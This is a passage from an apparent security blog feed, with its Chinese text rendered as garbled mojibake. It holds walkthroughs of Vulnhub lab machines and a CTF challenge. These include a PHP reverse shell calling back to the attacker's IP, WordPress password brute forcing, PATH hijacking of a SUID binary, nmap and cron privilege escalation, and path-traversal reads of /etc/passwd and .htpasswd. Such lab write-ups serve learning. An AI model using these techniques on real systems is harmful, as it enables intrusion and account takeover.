class="line">å°†ç”Ÿæˆçš„ç§é’¥ä¿å­˜åˆ°ï¼š/home/robertj/.ssh/id_rsa </span><br><span class="line">å°† SSH å…¬é’¥æ–‡ä»¶é‡å‘½åä¸º authorized_keys ï¼Œç”¨äº SSH ç™»é™†è®¤è¯</span><br><span class="line">cat id_rsa.pub &gt; authorized_keys</span><br><span class="line">ç„¶åå°†ç§é’¥å¤åˆ¶åˆ°æœ¬æœº</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421185302902.png" alt="image-20230421185302902"></p><p>ä¸€æ­¥ä¸€æ­¥è·Ÿç€æï¼Œç„¶åå°±ç”Ÿæˆäº†å¯†é’¥å’Œç§é’¥</p><p><a href="https://blog.csdn.net/Dontla/article/details/120902725">SSHå…¬é’¥åŸç†ï¼ˆå¯†é’¥ï¼Œç§˜é’¥ï¼Œç§é’¥ï¼‰</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh robertj@192.168.142.144 -i id_ssh</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421194215924.png" alt="image-20230421194215924"></p><p><img src="../images/image-20230421194359077.png" alt="image-20230421194359077"></p><p>suid  å‘ç°äº†ä¸€ä¸ªgetinfoå¯ä»¥è¿›è¡Œä½¿ç”¨</p><p><img src="../images/image-20230421194544476.png" alt="image-20230421194544476"></p><p>æ ¹æ®ä¸Šé¢è¾“å‡ºçš„ç»“æœï¼Œå¯ä»¥æ¨æµ‹è¿™ä¸ªç¨‹åºä¸­æ‰§è¡Œäº†</p><p><code>ip addr, cat /etc/hosts, uname -a</code><br>å› æ­¤ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç¯å¢ƒå˜é‡ PATH ä¸­æä¾›ä¸€ä¸ªç›®å½• (/tmp)ï¼Œå¹¶åˆ›å»ºä¸€ä¸ª ip<br>æˆ–è€… cat æ–‡ä»¶ï¼Œç”¨äºåŠ«æŒå‘½ä»¤ï¼Œæ‰§è¡Œæˆ‘ä»¬è‡ªå®šä¹‰çš„äºŒè¿›åˆ¶æ–‡ä»¶å°±å¯ä»¥ææƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">export PATH=/tmp/:$PATH</span><br><span class="line">cd /tmp</span><br><span class="line">echo &#x27;/bin/bash&#x27; &gt; ip</span><br><span class="line">chmod +x ip</span><br><span class="line">/usr/bin/getinfo</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421195813143.png" alt="image-20230421195813143"></p><p>æˆåŠŸææƒ</p><p><img src="../images/image-20230421195838680.png" alt="image-20230421195838680"></p><p><strong>æœ¬èŠ‚é€šè¿‡ä¿¡æ¯æ”¶é›†è·å–åˆ°æ•æ„Ÿæ–‡ä»¶ï¼Œè¿›è€Œ SSH æ—¥å¿—å†™åé—¨è·å– shellï¼Œç„¶åä¿¡æ¯æ”¶é›†</strong><br><strong>è·å– ssh ç§é’¥è·å– shellï¼Œæœ€ååˆ©ç”¨ suid-å‘½ä»¤åŠ«æŒææƒ</strong></p><p><strong>ä¿¡æ¯æ”¶é›†</strong><br><strong>Base64 è§£ç </strong><br><strong>sshæ—¥å¿—å†™åé—¨è·å– shell</strong><br><strong>ä¿¡æ¯æ”¶é›†è·å– ssh ç§é’¥è·å– shell</strong><br><strong>suid-å‘½ä»¤åŠ«æŒææƒ</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> DriftingBlues-3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhubâ€”â€”DriftingBlues-2</title>
      <link href="/posts/1e26cf11.html"/>
      <url>/posts/1e26cf11.html</url>
      
        <content type="html"><![CDATA[<p>(tmd,é…ç½®ä¸ªç½‘å¡é…ç½®åŠå¤©)</p><p>è¿˜æ˜¯å…ˆæ‰«ä¸€ä¸‹cæ®µ</p><p><img src="../images/image-20230421165628676.png" alt="image-20230421165628676"></p><p>ç„¶åè¿›è¡Œç«¯å£æ‰«æ</p><p><img src="../images/image-20230421170024112.png" alt="image-20230421170024112"></p><p>æ‰«æå‘ç°äº†ä¸‰ä¸ªç«¯å£  å¤šå‡ºæ¥çš„21ç«¯å£æ˜¯ftpæœåŠ¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å»å°è¯•ä¸€ä¸‹ï¼Œçœ‹èƒ½ä¸èƒ½åŒ¿åç™»å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.142.142</span><br><span class="line">ç”¨æˆ·åï¼šanonymous</span><br><span class="line">å¯†ç ï¼šç©º</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421170215786.png" alt="image-20230421170215786"></p><p>æˆåŠŸè¿›è¡Œç™»å½•</p><p>é‡Œé¢åªæœ‰ä¸€å¼ å›¾ç‰‡ï¼Œæ²¡å•¥ç”¨ï¼Œç„¶åè¿›è¡Œç«¯å£æ‰«æ</p><p><img src="../images/image-20230421170728331.png" alt="image-20230421170728331"></p><p><img src="../images/image-20230421170744040.png" alt="image-20230421170744040"></p><p>åªè®¿é—®è¿™ä¸ªblogçš„è¯æ˜¯wordpressæ¡†æ¶çš„</p><p>ç„¶åå°è¯•è¿›è¡Œä½¿ç”¨è¯¥æ¡†æ¶çš„æ‰«æå·¥å…·  <code>wpscan</code>è¿›è¡Œæ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.142.142/blog/ -e u</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421171032382.png" alt="image-20230421171032382"></p><p>æ‰«åˆ°ä¸€ä¸ªç”¨æˆ·   äºæ˜¯å°è¯•è¿›è¡Œå¯†ç ç ´è§£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.142.142/blog/ --passwords /usr/share/wordlists/rockyou.txt --usernames albert</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421171505615.png" alt="image-20230421171505615"></p><p>çˆ†ç ´åˆ°å¯†ç äº†</p><p><img src="../images/image-20230421171908888.png" alt="image-20230421171908888"></p><p>æ‰«åˆ°åå°äº†ï¼Œäºæ˜¯å°è¯•è¿›è¡Œç™»å½•</p><p><img src="../images/image-20230421172047872.png" alt="image-20230421172047872"></p><p>å¾—å…ˆè¿›è¡ŒåŸŸåçš„dnsé…ç½®å¥½</p><p><img src="../images/image-20230421172231456.png" alt="image-20230421172231456"></p><p>è¿›è¡Œä¿®æ”¹æˆåŠŸ</p><p><img src="../images/image-20230421172249279.png" alt="image-20230421172249279"></p><p><img src="../images/image-20230421172328984.png" alt="image-20230421172328984"></p><p>æˆåŠŸè¿›å…¥åå°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—å¯»æ‰¾å¯ä»¥è¿›è¡Œæ¼æ´åˆ©ç”¨çš„åœ°æ–¹äº†</p><p><img src="../images/59383e44fb3e4b81a094c70900c7777f.png" alt="img"></p><p>è¿™å°±æ˜¯æ¼æ´åˆ©ç”¨çš„ç‚¹</p><p>ä¿®æ”¹åçš„ä»£ç </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">ip=<span class="string">&quot;192.168.142.129&quot;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">port=3333;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sock=fsockopen(<span class="variable">$ip</span>, <span class="variable">$port</span>);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">descriptorspec=array(</span></span><br><span class="line">0=&gt;$sock,</span><br><span class="line">1=&gt;$sock,</span><br><span class="line">2=&gt;$sock</span><br><span class="line">);</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">process=proc_open(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span></span><br><span class="line"><span class="meta prompt_">proc_close($</span><span class="language-bash">process);</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421173119250.png" alt="image-20230421173119250"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://driftingblues.box/blog/index.php/xxx</span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„é¡µé¢ï¼Œå°±å¯ä»¥ç›´æ¥å¼¹shelläº†</p><p><img src="../images/image-20230421173724289.png" alt="image-20230421173724289"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨å‘½ä»¤ï¼špython -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>ç„¶åå°è¯•è¿›è¡Œææƒ</p><p>è¿›å…¥/home/freddieåå‘ç°å­˜åœ¨<strong>.ssh</strong>æ–‡ä»¶</p><p><img src="../images/image-20230421173917976.png" alt="image-20230421173917976"></p><p><img src="../images/image-20230421174018099.png" alt="image-20230421174018099"></p><p>å‘ç°å­˜åœ¨ç§é’¥å’Œå…¬é’¥</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•è¿›è¡Œsshç§é’¥ç™»å½•  </p><p><img src="../images/image-20230421175335627.png" alt="image-20230421175335627"></p><p>æŠŠç§é’¥è¿›è¡Œå¤åˆ¶è¿‡æ¥ï¼Œç„¶åç»™æƒé™ï¼Œç„¶åè¿›è¡Œç§é’¥ç™»å½•</p><p><img src="../images/image-20230421175515512.png" alt="image-20230421175515512"></p><p>ç›´æ¥è¿›è¡Œç§é’¥ç™»å½•äº†</p><p><img src="../images/image-20230421175554303.png" alt="image-20230421175554303"></p><p>æ‹¿åˆ°ç¬¬ä¸€ä¸ªflag</p><p><img src="../images/image-20230421175631172.png" alt="image-20230421175631172"></p><p>çŒœæµ‹æ˜¯ç”¨nampè¿›è¡Œææƒï¼Œç”¨çš„æ˜¯scriptæ¥è¿è¡Œè„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;os.execute(&#x27;/bin/bash&#x27;)&quot; &gt; getshell</span><br><span class="line">sudo nmap --script=getshell</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421175735156.png" alt="image-20230421175735156"></p><p>ç„¶åå°±å˜æˆäº†rootç”¨æˆ·äº†</p><p><img src="../images/image-20230421175816747.png" alt="image-20230421175816747"></p><p>æ‹¿åˆ°äº†å…¨éƒ¨çš„flagäº†</p><p><strong>æ€»ç»“</strong></p><p><strong>è¿™æ¬¡å‡ºç°äº†<code>21</code> ç«¯å£åŒ¿åç™»å…¥ä»¥åŠ<code>ssh</code> ç§é’¥ç™»å…¥ ï¼ˆæ–°çŸ¥è¯†ç‚¹ï¼‰</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub  DriftingBlues-2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhubâ€”â€”DriftingBlues-1</title>
      <link href="/posts/872f9eab.html"/>
      <url>/posts/872f9eab.html</url>
      
        <content type="html"><![CDATA[<p>è¿˜æ˜¯å…ˆæ‰«ä¸€ä¸‹cæ®µï¼Œå‘ç°ä¸€ä¸‹é¶æœºçš„ä½ç½®</p><p><img src="../images/image-20230421105027528.png" alt="image-20230421105027528"></p><p>å‘ç°é¶æœºçš„ipåœ°å€ï¼Œäºæ˜¯å°è¯•è¿›è¡Œç«¯å£æ‰«æ</p><p><img src="../images/image-20230421105115877.png" alt="image-20230421105115877"></p><p>å‘ç°ä¸¤ä¸ªipç«¯å£ï¼Œäºæ˜¯å°è¯•è¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230421105203784.png" alt="image-20230421105203784"></p><p>å‘ç°ä¸€ä¸ªç½‘ç«™</p><p>å°±æ˜¯ä¸€ä¸ªé™æ€é¡µé¢ï¼Œäºæ˜¯å°è¯•è¿›è¡Œç›®å½•æ‰«æ(æ²¡æ‰«åˆ°ä¸œè¥¿)</p><p>äºæ˜¯æŸ¥çœ‹åŸæºç å‘ç°å­˜åœ¨ä¸€æ®µbase64ç¼–ç çš„ä¸œè¥¿</p><p><img src="../images/image-20230421105559764.png" alt="image-20230421105559764"></p><p>è¿›è¡Œè§£ç </p><p><img src="../images/image-20230421105639164.png" alt="image-20230421105639164"></p><p><img src="../images/image-20230421105711803.png" alt="image-20230421105711803"></p><p>å‘ç°è¿™ä¸€æ®µä¸²ä¸œè¥¿   ä¸€å¤§å †okï¼Œäºæ˜¯å°è¯•å»è¿›è¡Œokè§£ç </p><p><img src="../images/image-20230421110217495.png" alt="image-20230421110217495"></p><p>è§£ç æˆåŠŸ </p><p><a href="https://tool.bugku.com/brainfuck/">è§£ç åœ°å€</a></p><p><img src="../images/image-20230421110339515.png" alt="image-20230421110339515"></p><p>è¿™é‡Œçš„æç¤ºæ˜¯ä¿®æ”¹åŸŸåï¼Œäºæ˜¯æˆ‘ä»¬å°è¯•è¿›è¡ŒåŸŸåçš„ä¿®æ”¹</p><p><img src="../images/image-20230421110653338.png" alt="image-20230421110653338"></p><p><img src="../images/image-20230421110755477.png" alt="image-20230421110755477"></p><p>ç„¶åå°è¯•å¯¹è¯¥åŸŸåè¿›è¡Œå­åŸŸåæ‰«æ</p><p>ä½¿ç”¨çš„å·¥å…·æ˜¯<code>gobuster</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -u driftingblues.box -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt --append-domain</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯å¿…é¡»å¾—åŠ ä¸Š<code>--append-domain</code>ï¼Œä¸ç„¶æ‰«ä¸å‡ºæ¥ï¼Œå› ä¸ºè¿™é‡Œå¡äº†å¥½ä¹…</p><p><img src="../images/image-20230421113251849.png" alt="image-20230421113251849"></p><p><strong>è¿™é‡Œæœ‰æœ‰ä¸¤ä¸ª 200çš„çŠ¶æ€ç  æ‰€ä»¥æˆ‘ä»¬éœ€è¦æŠŠ<code>test.driftingblues.box</code>åŸŸåä¹Ÿæ·»åŠ åˆ°<code>hosts</code>ä¸­</strong></p><p><img src="../images/image-20230421113553783.png" alt="image-20230421113553783"></p><p>æˆåŠŸæ·»åŠ è¿›å»äº†</p><p><img src="../images/image-20230421113628547.png" alt="image-20230421113628547"></p><p>ä¸çŸ¥é“æ˜¯å•¥ä¸œè¥¿ï¼Œäºæ˜¯å…ˆå°è¯•è¿›è¡Œç›®å½•æ‰«æ</p><p><img src="../images/image-20230421113728120.png" alt="image-20230421113728120"></p><p>æ‰«åˆ°ä¸€ä¸ªçˆ¬è™«åè®®çš„æ–‡æœ¬</p><p><img src="../images/image-20230421113758790.png" alt="image-20230421113758790"></p><p><strong>äºæ˜¯æŒ¨ä¸ªè¿›è¡Œè®¿é—®</strong></p><p><img src="../images/image-20230421114124994.png" alt="image-20230421114124994"></p><p><img src="../images/image-20230421114138045.png" alt="image-20230421114138045"></p><p>é‚£ä¹ˆå¯†ç å°±æ˜¯æœ‰åç§å¯èƒ½æ€§ï¼Œä½†æ˜¯ç”¨æˆ·åå´ä¸çŸ¥é“ï¼Œè¿™é‡Œé¢çš„sherylä¸æ˜¯ç”¨æˆ·åï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ç»“åˆæˆ‘ä»¬å‰é¢çœ‹åˆ°çš„okè§£ç åçš„ericæ¥è¿›è¡Œå°è¯•</p><p>åˆ©ç”¨hydraè¿›è¡Œsshå¯†ç çˆ†ç ´</p><p><img src="../images/image-20230421115204314.png" alt="image-20230421115204314"></p><p>å°è¯•æˆåŠŸï¼Œäºæ˜¯è¿›è¡Œç™»å½•</p><p><img src="../images/image-20230421115306167.png" alt="image-20230421115306167"></p><p>ç™»å½•æˆåŠŸï¼Œäºæ˜¯å°è¯•è¿›è¡Œææƒæ“ä½œ</p><p>è¿˜æ˜¯è€ä¸‰æ · sudo -l   suid  å†…æ ¸ææƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">suid    find / -perm /4000 2&gt;/dev/n</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421115516649.png" alt="image-20230421115516649"></p><p>å‘ç°æ²¡å•¥å¯ç”¨çš„</p><p>æŸ¥çœ‹å†…æ ¸ä¹Ÿæ²¡å‘ç°å•¥å¯åˆ©ç”¨çš„ï¼Œäºæ˜¯å°±å»æŸ¥çœ‹å¤‡ä»½æ–‡ä»¶ï¼Œçœ‹æœ‰å•¥ä¸œè¥¿</p><p><img src="../images/image-20230421154847073.png" alt="image-20230421154847073"></p><p>å­˜åœ¨ä¸€ä¸ªå¤‡ä»½æ–‡ä»¶ï¼Œç„¶åè¿›è¡Œè¯»å–</p><p><img src="../images/image-20230421154945160.png" alt="image-20230421154945160"></p><p><strong>ç»§ç»­æŸ¥çœ‹ä¸€ä¸‹å¤‡ä»½æ–‡ä»¶<code>backup.sh</code> å‘ç°<code>sudo</code>æ‰§è¡Œ<code>/tmp/emergency</code>æ–‡ä»¶ ä½†æ˜¯<code>/tmp</code> ä¸‹é¢æ²¡æœ‰ éœ€è¦åˆ›å»º å¹¶å°†<code>eric</code>ç”¨æˆ·åŠ å…¥<code>sudo</code>ç»„</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;cp /bin/bash /tmp/getroot; chmod +s /tmp/getroot&#x27; &gt; /tmp/emergency</span><br><span class="line">chmod +x emergency</span><br><span class="line">./getroot -p</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421160008777.png" alt="image-20230421160008777"></p><p>è¿™é‡Œèƒ½è¿™æ ·å†™æ˜¯å› ä¸ºbackup.shæ˜¯ä¸€ä¸ªå®šæ—¶æ–‡ä»¶ï¼Œæ¯è¿‡ä¸€ä¼šå°±ä¼šæ‰§è¡Œé‡Œé¢çš„1ä»£ç </p><p>è¿™é‡Œèƒ½ç»™getrootæƒé™æ˜¯å› ä¸ºæ‰§è¡Œemergencyæ˜¯ä»¥sudoæ¥æ‰§è¡Œçš„ï¼Œå°±æ˜¯ä»¥rootæƒé™æ¥æ‰§è¡Œçš„</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub  DriftingBlues-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>èœç‹—-çº¢æ˜è°·-wp</title>
      <link href="/posts/15f20e4d.html"/>
      <url>/posts/15f20e4d.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç‚¹å‡»ç­¾åˆ°"><a href="#ç‚¹å‡»ç­¾åˆ°" class="headerlink" title="ç‚¹å‡»ç­¾åˆ°"></a><strong>ç‚¹å‡»ç­¾åˆ°</strong></h2><p>åªéœ€è¦ä¸€ç›´ç‚¹å‡»å°±è¡Œï¼Œæœ€åä¼šåœ¨æœ«å°¾è¾“å‡ºflag</p><p><img src="../images/image-20230419163250747.png" alt="image-20230419163250747"></p><h2 id="Dreamer"><a href="#Dreamer" class="headerlink" title="Dreamer"></a><strong>Dreamer</strong></h2><p>é¢˜ç›®</p><p><img src="../images/image-20230419163405727.png" alt="image-20230419163405727"></p><p>ä¸€ä¸ªæ¡†æ¶</p><p>ä¸‹è½½é¢˜ç›®ç»™çš„æ–‡ä»¶ï¼Œå‘ç°åå°åœ°å€</p><p><img src="../images/image-20230419163458396.png" alt="image-20230419163458396"></p><p><strong>äºæ˜¯è¿›è¡Œç™»å½•</strong></p><p><img src="../images/image-20230419163537861.png" alt="image-20230419163537861"></p><p>ç„¶ågoogleæŸ¥æ‰¾è¯¥æ¼æ´å‘ç°</p><p><img src="../images/image-20230419163600887.png" alt="image-20230419163600887"></p><p><a href="https://forum.butian.net/share/2183">Dreamer CMS ä»£ç å®¡è®¡</a></p><p><img src="../images/image-20230419163637475.png" alt="image-20230419163637475"></p><p>è·Ÿç€æå°±èƒ½æ‹¿åˆ°flag</p><p><img src="../images/image-20230419163736391.png" alt="image-20230419163736391"></p><p>è®¿é—®å‰ç«¯é¡µé¢çš„testå°±è¡Œäº†</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-AI-WEB-2.0</title>
      <link href="/posts/32823e7e.html"/>
      <url>/posts/32823e7e.html</url>
      
        <content type="html"><![CDATA[<p>æ‰«cæ®µ</p><p><img src="../images/image-20230417221049663.png" alt="image-20230417221049663"></p><p>æ¥ä¸‹æ¥è¿›è¡Œç«¯å£æ‰«æ</p><p><img src="../images/image-20230417221237184.png" alt="image-20230417221237184"></p><p><img src="../images/image-20230418222017787.png" alt="image-20230418222017787"></p><p><strong>è¿™é‡Œçš„è¯401çŠ¶æ€ç æ˜¯</strong></p><p><img src="../images/image-20230418222047797.png" alt="image-20230418222047797"></p><p><img src="../images/image-20230418222147639.png" alt="image-20230418222147639"></p><p><strong>å°±æ˜¯æ²¡æœ‰æˆåŠŸè¿›è¡Œèº«ä»½éªŒè¯çš„æ„æ€</strong>  å¾—éœ€è¦æ‹¿åˆ°ç®¡ç†å‘˜çš„è´¦å·å¯†ç </p><p>å‘ç°åªæœ‰ä¸¤ä¸ªæ®µå£ï¼Œäºæ˜¯è¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230417221348842.png" alt="image-20230417221348842"></p><p>è¿›è¡Œæ³¨å†Œç™»å½•åçš„å¾—åˆ°çš„ç•Œé¢</p><p><img src="../images/image-20230417222911811.png" alt="image-20230417222911811"></p><p>è¿™ä¸ªæ˜¯å…³é”® ï¼ˆåˆšå¼€å§‹çœ‹çš„æ—¶å€™éƒ½ä¸çŸ¥é“è¿™æ˜¯å•¥ç©æ„)  è¿˜æ˜¯æ¥è§¦å¤ªå°‘äº†</p><p><img src="../images/image-20230418222302600.png" alt="image-20230418222302600"></p><p>å‘ç°æ¼æ´åº“é‡Œç¡®å®å­˜åœ¨è¯¥æ¼æ´</p><p>è¿™é‡Œç¬¬ä¸‰ä¸ªæ–‡ä»¶å¯ä»¥è¿›è¡ŒæŸ¥çœ‹ï¼Œæœ‰ç‚¹åƒç›®å½•ç©¿è¶Šçš„æ¼æ´ï¼Œè¿›è¡Œåé¢è·¯å¾„çš„è¯»å–</p><p><img src="../images/image-20230418222613446.png" alt="image-20230418222613446"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/download.php?file_name=../../../../../../../../../../../../../etc/passwd  ##åˆ©ç”¨æ¼æ´çœ‹passwd</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230418222713281.png" alt="image-20230418222713281"></p><p><img src="../images/image-20230418222929738.png" alt="image-20230418222929738"></p><p>å‘ç°å¯ä»¥è¿›è¡Œç›®å½•ç©¿è¶Šæ¥è¯»å–æ–‡ä»¶</p><p><strong>åœ¨<code>/etc/passwd/</code>ä¸‹é¢å‘ç°äº† ä¸¤ä¸ªç”¨æˆ· åˆ†åˆ«æ˜¯ <code>aiweb2</code> <code>n0nr00tuser</code>å¯èƒ½ç­‰ä¸‹éœ€è¦ç”¨åˆ°å…ˆæ”¾ç€ æ¥ç€è¯»å–ä¸€ä¸‹<code>apache</code> æ–‡ä»¶</strong></p><p>è¯»å–apacheçš„é…ç½®æ–‡ä»¶æ˜¯å› ä¸ºç½‘ç«™æ˜¯ç”±apacheç»„æˆï¼Œå¹¶ä¸”/etc/shadowè®¿é—®ä¸äº†ï¼Œè¯»å–ä¸åˆ°æ–‡ä»¶å†…å®¹ï¼Œäºæ˜¯å°±ä»apacheçš„é…ç½®æ–‡ä»¶ä¸‹æ‰‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.105/download.php?file_name=../../../../../../../../../../../../../etc/apache2/sites-enabled/000-default.conf</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230418223246777.png" alt="image-20230418223246777"></p><p>è¿™é‡Œçš„è¯å°±è¯»å–åˆ°äº†ä¸€ä¸ªå¾ˆå…³é”®çš„ä¿¡æ¯äº†ï¼Œäºæ˜¯è¿›è¡Œè¯¥æ–‡ä»¶çš„æŸ¥çœ‹ï¼Œçœ‹æ˜¯å¦å­˜åœ¨ç”¨æˆ·çš„å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/download.php?file_name=../../../../../../../../../../../../../etc/apache2/.htpasswd</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230418223401204.png" alt="image-20230418223401204"></p><p>æŸ¥åˆ°äº†åŠ å¯†åçš„å¯†ç ï¼Œäºæ˜¯ä½¿ç”¨johnå·¥å…·è¿›è¡Œç ´è§£ï¼Œçœ‹å­—å…¸é‡Œæ˜¯å¦å­˜åœ¨è¯¥å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aiweb2admin:$apr1$VXqmVvDD$otU1gx4nwCgsAOA7Wi.aU/</span><br></pre></td></tr></table></figure><p><strong>æ–°å»ºä¸€ä¸ª<code>3.txt</code> æŠŠåŠ å¯†çš„å¤åˆ¶è¿›å»<code>aiweb2admin:$apr1$VXqmVvDD$otU1gx4nwCgsAOA7Wi.aU/</code>ä½¿ç”¨å·¥å…·<code>john</code> ç ´è§£ å‘ç° ç ´è§£å¤±è´¥</strong></p><p><img src="../images/image-20230418223628610.png" alt="image-20230418223628610"></p><p>é‚£çœ‹æ¥å­—å…¸é‡Œé¢æœ‰ï¼Œäºæ˜¯å»æœºå™¨é‚£è¾¹çœ‹åˆ°</p><p><img src="../images/image-20230418223804961.png" alt="image-20230418223804961"></p><p><strong>åé¢æ‰å‘ç° ç»™çš„æç¤ºæœ‰å­—å…¸çš„åç§°:<code>rockyou-45.txt</code> å»<code>github</code> ä¸Šé¢æ‰¾ä¸€ä¸ªä¸‹è½½ä¸€ä¸‹å³å¯ï¼ˆè¿™é‡Œæ²¡æœ‰å¤–ç½‘ æœ¬æœºä¸‹è½½æ‹–åˆ°kaliï¼‰</strong></p><p>è®°å¾—ä½¿ç”¨googleæœç´¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou-45.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230418224240532.png" alt="image-20230418224240532"></p><p>æˆåŠŸå°†å­—å…¸ä¸‹è½½ä¸‹æ¥ï¼Œäºæ˜¯å†æ¬¡è¿›è¡Œç ´è§£</p><p><img src="../images/image-20230418230511475.png" alt="image-20230418230511475"></p><p>æŠŠå¯†ç ç ´è§£å‡ºæ¥äº†ï¼Œäºæ˜¯å°è¯•sshè¿æ¥</p><p><img src="../images/image-20230418230644880.png" alt="image-20230418230644880"></p><p>å‘ç°ç¡®å®ä¸æ˜¯è¿æ¥sshçš„å¯†ç ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸è¦å¿˜äº†å‰é¢çˆ†å‡ºæ¥çš„ä¸€ä¸ª401çš„ç½‘å€ï¼Œäºæ˜¯æˆ‘ä»¬å°è¯•è¿›è¡Œç™»å½•è¯•è¯•</p><p><img src="../images/image-20230418230806582.png" alt="image-20230418230806582"></p><p>æˆåŠŸç™»å½•æˆåŠŸï¼Œäºæ˜¯æˆ‘ä»¬å¼€å§‹æŸ¥çœ‹ï¼Œçœ‹å“ªäº›åœ°æ–¹å¯ä»¥è¿›è¡Œåˆ©ç”¨</p><p><img src="../images/image-20230418230848255.png" alt="image-20230418230848255"></p><p>è¯»å–robots.txtæ–‡ä»¶å‘ç°å­˜åœ¨ç›®å½•ï¼Œäºæ˜¯è¿›è¡Œè®¿é—®Â·</p><p>ç¬¬ä¸€ä¸ªæ˜¯ä¸€ä¸ªpingå‘½ä»¤ï¼Œ</p><p><img src="../images/image-20230418231326496.png" alt="image-20230418231326496"></p><p>æˆåŠŸè¿›è¡Œå‘½ä»¤çš„æ‰§è¡Œ</p><p>äºæ˜¯æŸ¥çœ‹ç¬¬äºŒä¸ªç›®å½•</p><p><img src="../images/image-20230418231728302.png" 